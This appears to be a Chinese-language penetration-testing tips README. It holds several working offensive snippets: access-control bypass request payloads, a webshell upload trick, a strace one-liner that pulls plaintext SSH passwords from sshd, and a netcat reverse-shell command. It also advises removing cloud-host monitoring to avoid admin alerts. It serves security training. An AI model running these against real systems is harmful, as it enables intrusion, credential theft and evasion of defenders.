# Pentest101
每周(也许不)分享一些关于渗透测试的知识点

---

有时候我们拿了一台 docker 机器，发现没有 ifconfig 命令也没有 ip 命令，不清楚怎么看 IP，这时候可以通过查看 proc 文件的方式来查看
```bash
cat /proc/net/fib_trie
cat /etc/sysconfig/network
```

---

渗透时遇到某些上传点未作过滤，但负载均衡做了过滤后缀名的情况，可以上传 webshell 命名为 index.php，然后访问 xxx.com/xxx/upload, 尝试 bypass 反代的策略

---

当渗透时遇到了 403 或者 302、401 的拒绝访问，不要怕，多 FUZZ 几次
- 从 HTTP Header 层面 bypass
    ```bash
    GET /admin HTTP/1.1
    Host: web.com   # ===> 403

    GET /anything HTTP/1.1
    Host: web.com
    X-Original-URL: /admin  # ===> 200

    GET /anything HTTP/1.1
    Host: web.com
    Referer: https://web.com/admin  # ===> 200

    GET https://qq.com HTTP/1.1
    Host: web.com   # ===> SSRF
    ```

- 从 URL 参数层面 bypass
    ```bash
    /admin/panel    # ===> 403
    /admin/monitor  # ===> 200

    /admin/monitor/;panel   # ===> 302
    ```
    ```bash
    web.com/admin   # ===> 403

    web.com/ADMIN       # ===> 200
    web.com/admin/      # ===> 200
    web.com/admin/.     # ===> 200
    web.com//admin//    # ===> 200
    web.com/./admin/./  # ===> 200
    web.com/./admin/..  # ===> 200
    web.com/%2f/admin/  # ===> 200
    web.com/admin.json  # ===> 200(ruby)

    web.com/%2e/admin   # ===> 200
    web.com/%252e/admin # ===> 200
    web.com/%ef%bc%8fadmin  # ===> 200

    web.com/admin       # ===> 302
    web.com/admin..;/   # ===> 200
    ```

- 从协议层面 bypass
    ```bash
    http://web.com/admin    # ===> 403
    https://web.com/admin   # ===> 200
    ```

---

当我们拿下 windows 机器时可以通过抓内存中的密码进行横向，但 linux 却不可能抓到内存中的密码，但是 Debian 系列下的 linux 系统可以通过监听 sshd 进程的数据抓取出明文密码，比如你拿下了一台管理员机器，上面由 xshell，你可以手动开一个监听，在开一个登录，监听的窗口上就抓出密码了
```bash
strace -xx -fp `cat /var/run/sshd.pid` 2>&1| grep --line-buffered -P 'write\(\d, "\\x00' | perl -lne '$|++; @F=/"\s*([^"]+)\s*"/g;for (@F){tr/\\x//d}; print for @F'|grep --line-buffered -oP '.{8}\K([2-7][0-9a-f])*$'|grep --line-buffered -v '^64$'|perl -pe 's/([0-9a-f]{2})/chr hex $1/gie'
```

---

渗透时尽量不要暴露自己的 IP 地址，挂代理是必须的
- linux 下要查看自己终端是否走代理可以 curl https://ifconfig.me/ 看下返回的 IP 地址
- windows 就直接访问 https://ifconfig.me/ 即可

---

linux 下代理不用多说, proxychains-ng，windows 下推荐用 Proxifier

---

MSF 和 CS 中 Stage 与 Stageless 的区别
- Stage ： 先传一个 shellcode，然后回连端口，加载恶意 metsrv，然后再请求 stdapi 于 priv，进行上线
- Stageless ： 将 shellcode、metsrv、stdapi、priv 打包，一次性传完
- 如果想让 msf 直接回弹到 NC，那么必须要用 stageless

---

判断目标主机是不是虚拟机、容器
- windows
    - cmd : systeminfo
    - Powershell : get-wmiobject win32_computersystem | fl model
- linux
    ```bash
    lshw -class system | grep -i VM & grep -i virtual
    dmesg | grep -i VM & grep -i virtual
    dmidecode -s system-product-name
    ls /tmp
    systemd-detect-virt
    virt-what
    ls -alh /.dockerenv
    cat /proc/1/cgroup
    ```

---

msf 框架其实有许多 UI 界面的工具, 可以帮助不习惯命令行的渗透测试人员进行渗透，我举几个例子
- https://github.com/FunnyWolf/Viper
- https://github.com/WayzDev/Kage

---

在进行云主机后渗透时，如果触发敏感操作，会有短信提醒到管理员手机上，这个时候可以酌情考虑卸载云主机的监控 (有时你用云主机装 SSR 会无法连接也是这个原因)

---

最近在 linux 搭建 vpn 服务的时候遇到时间和时区不同步的情况，分享下解决方案
- 查看当前时区：timedatectl
- 修改当前时区：
- timedatectl set-timezone Asia/Shanghai
- 或
- cp  /usr/share/zoneinfo/Asia/Shanghai  /etc/localtime

---

rlwrap 工具，可以完美解决各类 shell 中无法上下左右的问题

例如 ，回弹了 shell，手贱按了上，这种情况(我想你一定遇到过🤣🤣🤣🤣)
- 安装：apt install rlwrap
- 使用： rlwrap [Command]

---

cAdvisor 是 Google 出品的用于监控 Docker 容器的服务，渗透时遇到这个服务基本上是存在容器环境

---

新版 kali 2020 版后使用 root 账号默认不给密码，如果你想,可以直接进行修改 : sudo passwd root

---

nc 具有多个版本, 比如: traditional、openbsd、ncat
- traditional 最老的版本,支持最基本的功能
- openbsd 安全版本,回弹要用一大段命令
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
- ncat 新版本, 重构了旧版的代码并支持了许多新功能, debian 系列发行版下通过以下命令进行安装配置
    apt install -y ncat
    update-alternatives --set nc /usr/bin/ncat
